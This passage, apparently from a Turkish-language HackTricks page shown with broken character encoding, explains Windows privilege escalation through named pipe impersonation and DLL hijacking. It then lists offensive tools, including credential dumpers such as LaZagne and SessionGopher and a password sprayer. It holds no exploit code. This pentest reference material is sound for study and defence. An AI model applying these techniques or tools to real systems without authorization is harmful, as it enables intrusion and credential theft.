Bu teknik, `getsystem` iÃ§inde yÃ¼kselmek iÃ§in meterpreter tarafÄ±ndan kullanÄ±lÄ±r. Teknik, **bir boru oluÅŸturmayÄ± ve ardÄ±ndan o boruya yazmak iÃ§in bir hizmet oluÅŸturup/istismar etmeyi** iÃ§erir. Daha sonra, boruyu oluÅŸturan **sunucu** (boruyu oluÅŸturan **`SeImpersonate`** ayrÄ±calÄ±ÄŸÄ±nÄ± kullanan) boru istemcisinin (hizmetin) token'Ä±nÄ± **taklit edebilecek** ve SYSTEM ayrÄ±calÄ±klarÄ±nÄ± elde edecektir.\
[**AdlandÄ±rÄ±lmÄ±ÅŸ boru istemcisi taklit hakkÄ±nda daha fazla bilgi edinmek istiyorsanÄ±z burayÄ± okumalÄ±sÄ±nÄ±z**](./#named-pipe-client-impersonation).\
[**YÃ¼ksek bÃ¼tÃ¼nlÃ¼kten System'e adlandÄ±rÄ±lmÄ±ÅŸ borular kullanarak nasÄ±l geÃ§ileceÄŸine dair bir Ã¶rnek okumak istiyorsanÄ±z burayÄ± okumalÄ±sÄ±nÄ±z**](from-high-integrity-to-system-with-name-pipes.md).

### Dll KaÃ§Ä±rma

**SYSTEM** olarak Ã§alÄ±ÅŸan bir **sÃ¼reÃ§** tarafÄ±ndan **yÃ¼klenen bir dll'yi kaÃ§Ä±rmayÄ±** baÅŸarÄ±rsanÄ±z, bu izinlerle keyfi kodu yÃ¼rÃ¼tebilirsiniz. Bu nedenle Dll KaÃ§Ä±rma, bu tÃ¼r ayrÄ±calÄ±k yÃ¼kseltmesi iÃ§in de yararlÄ±dÄ±r ve ayrÄ±ca, yÃ¼ksek bÃ¼tÃ¼nlÃ¼k sÃ¼recinden **daha kolay bir ÅŸekilde baÅŸarÄ±labilir** Ã§Ã¼nkÃ¼ dll'leri yÃ¼klemek iÃ§in kullanÄ±lan klasÃ¶rlerde **yazma izinleri** olacaktÄ±r.\
[**Dll kaÃ§Ä±rma hakkÄ±nda daha fazla bilgi edinebilirsiniz**](dll-hijacking/)**.**

### **YÃ¶netici veya AÄŸ Hizmetinden System'e**

{% embed url="https://github.com/sailay1996/RpcSsImpersonator" %}

### LOCAL SERVICE veya NETWORK SERVICE'den tam ayrÄ±calÄ±klara

**Oku:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## Daha fazla yardÄ±m

[Statik impacket ikili dosyalarÄ±](https://github.com/ropnop/impacket\_static\_binaries)

## FaydalÄ± araÃ§lar

**Windows yerel ayrÄ±calÄ±k yÃ¼kseltme vektÃ¶rlerini aramak iÃ§in en iyi araÃ§:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- YanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± ve hassas dosyalarÄ± kontrol edin (**[**buraya bakÄ±n**](https://github.com/carlospolop/hacktricks/blob/tr/windows/windows-local-privilege-escalation/broken-reference/README.md)**). AlgÄ±landÄ±.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- BazÄ± olasÄ± yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± kontrol edin ve bilgi toplayÄ±n (**[**buraya bakÄ±n**](https://github.com/carlospolop/hacktricks/blob/tr/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- YanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± kontrol edin**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kaydedilmiÅŸ oturum bilgilerini Ã§Ä±karÄ±r. Yerelde -Thorough kullanÄ±n.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Kimlik YÃ¶neticisinden kimlik bilgilerini Ã§Ä±karÄ±r. AlgÄ±landÄ±.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan ÅŸifreleri etki alanÄ± boyunca yayÄ±nlayÄ±n**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, bir PowerShell ADIDNS/LLMNR/mDNS/NBNS sahtekar ve araÃ§tÄ±r.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel ayrÄ±calÄ±k yÃ¼kseltme Windows numaralandÄ±rmasÄ±**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- Bilinen ayrÄ±calÄ±k yÃ¼kseltme zafiyetlerini arayÄ±n (Watson iÃ§in DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(YÃ¶netici haklarÄ± gerektirir)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen ayrÄ±calÄ±k yÃ¼kseltme zafiyetlerini arayÄ±n (VisualStudio kullanÄ±larak derlenmesi gerekmektedir) ([**derlenmiÅŸ**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- YanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± arayan ana bilgisayarÄ± numaralandÄ±rÄ±r (daha Ã§ok bir bilgi toplama aracÄ±dÄ±r) (derlenmesi gerekmektedir) **(**[**derlenmiÅŸ**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- BirÃ§ok yazÄ±lÄ±mdan kimlik bilgilerini Ã§Ä±karÄ±r (github'da derlenmiÅŸ exe)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'Ä±n C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- YanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± kontrol edin (github'da derlenmiÅŸ yÃ¼rÃ¼tÃ¼lebilir dosya). Tavsiye edilmez. Win10'da iyi Ã§alÄ±ÅŸmaz.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- OlasÄ± yanlÄ±ÅŸ yapÄ±landÄ±rmalarÄ± kontrol edin (python'dan exe). Tavsiye edilmez. Win10'da iyi Ã§alÄ±ÅŸmaz.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gÃ¶nderiye dayanarak oluÅŸturulan araÃ§ (dÃ¼zgÃ¼n Ã§alÄ±ÅŸmasÄ± iÃ§in accesschk'ye ihtiyaÃ§ duymaz ancak kullanabilir).

**Yerel**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** Ã§Ä±ktÄ±sÄ±nÄ± okur ve Ã§alÄ±ÅŸan aÃ§Ä±klarÄ± Ã¶nerir (yerel python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** Ã§Ä±ktÄ±sÄ±nÄ± okur ve Ã§alÄ±ÅŸan aÃ§Ä±klarÄ± Ã¶nerir (yerel python)

**Meterpreter**

_multi/recon/local\_exploit\_suggestor_

Projeyi doÄŸru .NET sÃ¼rÃ¼mÃ¼nÃ¼ kullanarak derlemeniz gerekmektedir ([buna bakÄ±n](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Kurban ana bilgisayar Ã¼zerinde yÃ¼klÃ¼ .NET sÃ¼rÃ¼mÃ¼nÃ¼ gÃ¶rmek iÃ§in yapabileceÄŸiniz:

```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```

## Kaynaklar

* [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)\\
* [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)\\
* [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=\_8xJaaQlpBo)\\
* [https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege\_escalation\_windows.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)\\
* [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)\\
* [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)\\
* [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)\\
* [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* \*\*Bir \*\*cybersecurity ÅŸirketinde mi Ã§alÄ±ÅŸÄ±yorsunuz? Åirketinizin **HackTricks'te reklamÄ±nÄ± gÃ¶rmek** ister misiniz? ya da **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne eriÅŸmek veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**The PEASS Ailesi**](https://opensea.io/collection/the-peass-family)'ni keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu
* [**Resmi PEASS & HackTricks swag**](https://peass.creator-spring.com)'Ä±mÄ±zÄ± alÄ±n
* **KatÄ±lÄ±n** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya beni **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.** takip edin
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± gÃ¶ndererek** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **Ã¼zerinden PR'lar gÃ¶nderin.**

</details>
